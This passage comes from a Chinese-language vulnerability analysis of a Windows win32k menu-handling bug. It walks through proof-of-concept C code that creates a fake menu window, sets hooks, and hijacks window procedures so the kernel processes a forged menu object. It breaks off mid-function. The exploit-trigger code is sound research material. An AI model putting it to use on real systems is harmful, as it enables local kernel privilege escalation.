    RegisterClassExW(&wndClass);
    hWindowMain = CreateWindowExW(WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TOPMOST,
        L"WNDCLASSMAIN",
        NULL,
        WS_VISIBLE,
        0,
        0,
        1,
        1,
        NULL,
        NULL,
        GetModuleHandleA(NULL),
        NULL);
_创建拥有者窗口对象的验证代码_
接下来创建关键的 `#32768` 类型的菜单窗口对象并将句柄存储在 `hwndFakeMenu`
全局变量中，这个窗口对象接下来将作为用来利用的目标对象。同时将新创建目标窗口对象的消息处理函数成员域篡改为由验证代码后续自定义的
`xxFakeMenuWindowProc` 消息处理函数。
    hwndFakeMenu = CreateWindowExW(WS_EX_TOOLWINDOW | WS_EX_DLGMODALFRAME | WS_EX_WINDOWEDGE,
        L"#32768",
        NULL,
        WS_POPUP | WS_BORDER,
        0,
        0,
        1,
        1,
        NULL,
        NULL,
        NULL,
        NULL);
    SetWindowLongW(hwndFakeMenu, GWL_WNDPROC, (LONG)xxFakeMenuWindowProc);
_创建用来利用的菜单窗口对象的验证代码_
设置类型为 `WH_CALLWNDPROC` 的自定义挂钩处理程序，并设置范围包括 `EVENT_SYSTEM_MENUPOPUPSTART`
的自定义事件通知处理程序。
    SetWindowsHookExW(WH_CALLWNDPROC, xxWindowHookProc,
        GetModuleHandleA(NULL),
        GetCurrentThreadId());
    SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, EVENT_SYSTEM_MENUPOPUPSTART,
        GetModuleHandleA(NULL),
        xxWindowEventProc,
        GetCurrentProcessId(),
        GetCurrentThreadId(),
        0);
_设置自定义挂钩处理程序和事件通知处理程序的验证代码_
接下来通过调用 `TrackPopupMenuEx` 函数触发作为根菜单的第一个菜单对象在屏幕中的显示；然后使用 `GetMessage`
使当前线程进入消息循环状态。
    TrackPopupMenuEx(hMenuList[0], 0, 0, 0, hWindowMain, NULL);
    MSG msg = { 0 };
    while (GetMessageW(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
_触发第根菜单对象在屏幕中显示的验证代码_
当用户进程调用函数 `TrackPopupMenuEx` 时，系统在内核中最终调用到 `xxxTrackPopupMenuEx`
函数处理弹出菜单操作。在显示任务执行完成时，函数调用 `xxxWindowEvent` 以分发 `EVENT_SYSTEM_MENUPOPUPSTART`
类型的事件通知，这表示目标菜单对象已显示在屏幕中。
在该事件通知分发后，执行流会进入验证代码自定义的事件通知处理程序 `xxWindowEventProc`
中。在处理程序中进行计数，并存储每次进入时的窗口句柄 `hwnd`
参数。当第一次进入处理程序函数时，表示根菜单已显示在屏幕中，处理程序将窗口句柄参数存储在全局变量 `hwndRootMenu` 中，并调用函数
`SendMessage` 向根菜单窗口对象发送 `WM_LBUTTONDOWN` 鼠标左键按下的消息以触发子菜单的弹出显示，并在参数 `lParam`
传入鼠标按下的相对坐标，坐标值应在当前菜单的子菜单项区域范围内，这将在内核中进入函数 `xxxMNOpenHierarchy`
处理子菜单的显示。与前面同样地，在显示任务执行完成时，函数调用 `xxxWindowEvent` 以分发
`EVENT_SYSTEM_MENUPOPUPSTART` 类型的事件通知，这表示目标菜单对象已显示在屏幕中。
当第二次进入处理程序函数时，表示子菜单已显示在屏幕中，根菜单窗口对象和子菜单窗口对象此时已经通过各自的弹出菜单 `tagPOPUPMENU`
对象完成关联。处理程序将窗口句柄参数存储在全局变量 `hwndHintMenu` 中，并调用函数 `SendMessage`
向第一次进入时存储的根菜单窗口对象 `hwndRootMenu` 发送 `WM_MOUSEMOVE` 鼠标移动的消息。这将使执行流在内核中进入
`xxxMNMouseMove` 函数中。
    VOID CALLBACK
    xxWindowEventProc(
        HWINEVENTHOOK hWinEventHook,
        DWORD         event,
        HWND          hwnd,
        LONG          idObject,
        LONG          idChild,
        DWORD         idEventThread,
        DWORD         dwmsEventTime
    )
    {
        switch (iMenuCreated)
        {
        case 0:
            hwndRootMenu = hwnd;
            SendMessageW(hwndRootMenu, WM_LBUTTONDOWN, 0, 0x00050005);
            break;
        case 1:
            hwndHintMenu = hwnd;
            SendMessageW(hwndRootMenu, WM_MOUSEMOVE, 0, 0x00060006);
            break;
        }
        iMenuCreated++;
    }
_验证代码自定义的事件通知处理程序函数_
需要注意的是，这两次对函数 `SendMessage` 的调用中，参数 `lParam` 均作为鼠标指针的相对坐标，其 `32` 位数据的高低 `16`
位分别存储横坐标和纵坐标的相对值。两次调用时传入的 `lParam` 参数不能重复，否则将导致在函数 `xxxMNMouseMove`
中判断坐标是否改变时得到未改变的结果，函数将直接返回。
在函数 `xxxMNMouseMove` 执行期间，系统调用函数 `xxxMNFindWindowFromPoint`
在查找坐标点坐落的菜单窗口对象指针。由于我们为根菜单创建并关联了子菜单对象，并且子菜单对象已显示在屏幕中，因此当前的根弹出菜单对象成员域
`spwndNextPopup` 指向子菜单窗口对象的地址。函数 `xxxMNFindWindowFromPoint` 将向子菜单窗口对象发送
`MN_FINDMENUWINDOWFROMPOINT` 消息。在函数 `xxxSendMessageTimeout`
调用对象指定的消息处理程序之前，将首先调用 `xxxCallHook` 函数以分发先前由用户进程设定的 `WH_CALLWNDPROC`
类型的挂钩处理程序。这将进入先前验证代码自定义的挂钩处理程序函数 `xxWindowHookProc` 中。
在自定义挂钩处理程序函数中，参数 `lParam` 指向 `tagCWPSTRUCT` 类型的对象。验证代码判断 `tagCWPSTRUCT` 对象的成员域
`message` 的值，当该值为 `0x1EB` 时，表示当前在内核中正处于在函数 `xxxSendMessageTimeout`
中调用子菜单窗口对象的消息处理函数以投递 `MN_FINDMENUWINDOWFROMPOINT` 消息之前。
验证代码判断当前的目标窗口对象句柄是否为先前存储的子菜单窗口句柄，如果是的话则修改目标窗口对象的消息处理函数为自定义的
`xxHintMenuWindowProc` 消息处理函数。
    LRESULT CALLBACK
    xxWindowHookProc(INT code, WPARAM wParam, LPARAM lParam)
    {
        tagCWPSTRUCT *cwp = (tagCWPSTRUCT *)lParam;
        if (cwp->message == 0x1EB && cwp->hwnd == hwndHintMenu)
        {
            // MN_FINDMENUWINDOWFROMPOINT
            SetWindowLongW(cwp->hwnd, GWL_WNDPROC, (LONG)xxHintMenuWindowProc);
        }
        return CallNextHookEx(0, code, wParam, lParam);
    }
_验证代码自定义的挂钩处理程序函数_
执行流回到 `xxxSendMessageTimeout` 函数中，此时目标菜单窗口对象的消息处理函数已被篡改为自定义的
`xxHintMenuWindowProc` 消息处理函数，因此将在接下来回调到用户上下文执行该自定义消息处理函数实现消息投递。在函数
`xxHintMenuWindowProc` 中直接返回先前创建用于利用的 `hwndFakeMenu` 窗口对象句柄。
    LRESULT WINAPI
    xxHintMenuWindowProc(
        _In_ HWND   hwnd,
        _In_ UINT   msg,
        _In_ WPARAM wParam,
        _In_ LPARAM lParam
    )
    {
        if (msg == 0x1EB)
        {
            return (LRESULT)hwndFakeMenu;
        }
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
_验证代码自定义的子菜单窗口对象消息处理函数_
在内核中，函数 `xxxMNFindWindowFromPoint` 将 `xxxSendMessage`
函数的返回值作为查找到的窗口句柄并转换成窗口对象，将窗口对象地址作为返回值向上级调用者返回。
在执行一系列的判断等操作之后，函数 `xxxMNMouseMove` 调用 `xxxSendMessage` 函数向查找到的目标菜单窗口对象发送
`MN_SELECTITEM` 消息。这将进入验证代码自定义的利用菜单窗口对象消息处理函数 `xxFakeMenuWindowProc` 中。
在函数 `xxFakeMenuWindowProc` 中，验证代码判断消息参数的值。当消息参数值为 `0x1E5` 时，表示当前正在处理的是
`MN_SELECTITEM` 消息，根据内核函数的代码逻辑，验证代码在这里将 `MF_POPUP`(`0x00000010L`) 作为返回值返回。
函数 `xxxMNMouseMove` 在对返回的标志变量进行判断之后，调用函数 `xxxSendMessage` 发送向目标菜单窗口对象发送
`MN_SETTIMERTOOPENHIERARCHY` 消息。这将再次进入自定义消息处理函数中。
在函数 `xxFakeMenuWindowProc` 中，验证代码判断消息参数值为 `0x1F0` 时，直接将 `0`
作为返回值返回。在内核中函数将得到“调用失败”的返回值，因此将继续向下调用 `xxxMNHideNextHierarchy` 函数。
    LRESULT WINAPI
    xxFakeMenuWindowProc(
        _In_ HWND   hwnd,
        _In_ UINT   msg,
        _In_ WPARAM wParam,
        _In_ LPARAM lParam